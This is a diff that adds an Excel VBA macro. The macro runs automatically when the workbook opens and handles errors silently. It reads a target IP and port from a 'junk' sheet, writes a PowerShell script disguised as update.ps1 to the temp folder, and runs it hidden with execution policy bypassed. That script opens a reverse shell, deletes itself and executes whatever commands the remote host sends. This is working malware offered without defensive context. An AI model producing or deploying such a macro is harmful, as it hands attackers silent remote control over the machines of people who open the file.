@@ -1,0 +1,65 @@
+' Paste this code in the Excel VBA Editor (Alt+F11)
+' This will run automatically when the Excel file is opened
+
+Private Sub Workbook_Open()
+    On Error GoTo ErrorHandler
+    Call ExecutePowerShellScript
+    Exit Sub
+ErrorHandler:
+    ' Silent error handling
+    Exit Sub
+End Sub
+
+Sub ExecutePowerShellScript()
+    Dim wsh As Object
+    Dim waitOnReturn As Boolean
+    Dim windowStyle As Integer
+    Dim tempFile As String
+    Dim fileNumber As Integer
+    Dim junkSheet As Worksheet
+    
+    ' === CONFIGURATION FROM "JUNK" SHEET ===
+    Dim targetIP As String
+    Dim targetPort As String
+    
+    On Error Resume Next
+    Set junkSheet = ThisWorkbook.Sheets("junk")
+    If junkSheet Is Nothing Then
+        targetIP = "127.0.0.1"
+        targetPort = "4444"
+    Else
+        targetIP = Trim(junkSheet.Range("A30").Value)
+        targetPort = Trim(junkSheet.Range("A31").Value)
+        If targetIP = "" Then targetIP = "127.0.0.1"
+        If targetPort = "" Then targetPort = "4444"
+    End If
+    On Error GoTo 0
+    ' === END CONFIGURATION ===
+    
+    Application.DisplayAlerts = False
+    Application.EnableEvents = False
+    Application.ScreenUpdating = False
+    
+    tempFile = Environ("TEMP") & "\update.ps1"
+    fileNumber = FreeFile
+    
+    Open tempFile For Output As #fileNumber
+    Print #fileNumber, CreatePowerShellScript(targetIP, targetPort, tempFile)
+    Close #fileNumber
+    
+    Set wsh = CreateObject("WScript.Shell")
+    waitOnReturn = False
+    windowStyle = 0
+    
+    wsh.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & tempFile & """", windowStyle, waitOnReturn
+    
+    Application.ScreenUpdating = True
+    Application.EnableEvents = True
+    Application.DisplayAlerts = True
+End Sub
+
+Function CreatePowerShellScript(ip As String, port As String, scriptPath As String) As String
+    Dim script As String
+    script = "$ip = '" & ip & "'; $port = " & port & "; $scriptPath = '" & scriptPath & "'; try { $client = New-Object System.Net.Sockets.TCPClient($ip, $port); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $reader = New-Object System.IO.StreamReader($stream); $writer.AutoFlush = $true; Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue; $writer.Write('C:\> '); while($client.Connected) { $command = $reader.ReadLine(); if ($command -eq 'exit') { break }; if ($command -eq $null) { break }; try { $output = iex $command 2>&1 | Out-String; $writer.Write($output); } catch { $writer.WriteLine('Error executing command'); } $writer.Write('C:\> '); } $reader.Close(); $writer.Close(); $stream.Close(); $client.Close(); } catch { }"
+    CreatePowerShellScript = script
+End Function
